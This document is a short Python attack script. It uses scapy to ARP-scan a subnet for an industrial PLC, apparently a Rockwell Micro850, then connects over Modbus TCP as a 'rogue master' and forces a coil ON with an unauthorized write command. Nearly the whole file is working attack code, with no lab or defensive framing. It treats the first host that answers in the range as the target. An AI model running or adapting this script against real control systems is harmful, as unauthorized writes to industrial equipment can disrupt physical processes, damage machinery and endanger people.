from scapy.all import ARP, Ether, srp
from pymodbus.client import ModbusTcpClient
import time

# Network settings
TARGET_SUBNET = "192.168.1.0/24"  # Modify based on your network

# Function to scan network and find Rockwell Micro850 PLC
def find_plc():
    print("[+] Scanning network for Rockwell Micro850 PLC...")
    arp_request = ARP(pdst=TARGET_SUBNET)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered, _ = srp(broadcast / arp_request, timeout=2, verbose=False)

    for sent, received in answered:
        if received.psrc.startswith("192.168.1."):  # Adjust based on expected IP range
            print(f"[+] Possible PLC found: {received.psrc}")
            return received.psrc
    
    print("[-] No PLC found.")
    return None

# Function to impersonate a Rogue Master and send unauthorized control messages
def rogue_master_attack(plc_ip):
    if not plc_ip:
        print("[-] No PLC IP found, aborting attack.")
        return

    print(f"[+] Attempting connection to PLC at {plc_ip}...")

    # Establish a Modbus TCP connection
    client = ModbusTcpClient(plc_ip, port=502)
    if not client.connect():
        print("[-] Connection failed. Ensure the PLC has Modbus TCP enabled.")
        return

    print(f"[+] Rogue Master connected to {plc_ip}!")

    # Sending unauthorized write command (Example: force a coil ON)
    # Modify based on the PLC's actual register mapping
    try:
        print("[+] Sending unauthorized control command...")
        response = client.write_coil(0, True)  # Turning ON a coil at address 0
        if response.isError():
            print("[-] Failed to execute unauthorized command.")
        else:
            print("[+] Unauthorized command executed successfully!")

    except Exception as e:
        print(f"[-] Error during attack: {e}")

    client.close()
    print("[+] Rogue Master attack complete.")

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc()  # Step 1: Discover PLC IP
    time.sleep(1)  # Small delay before attack
    rogue_master_attack(plc_ip)  # Step 2: Attack the PLC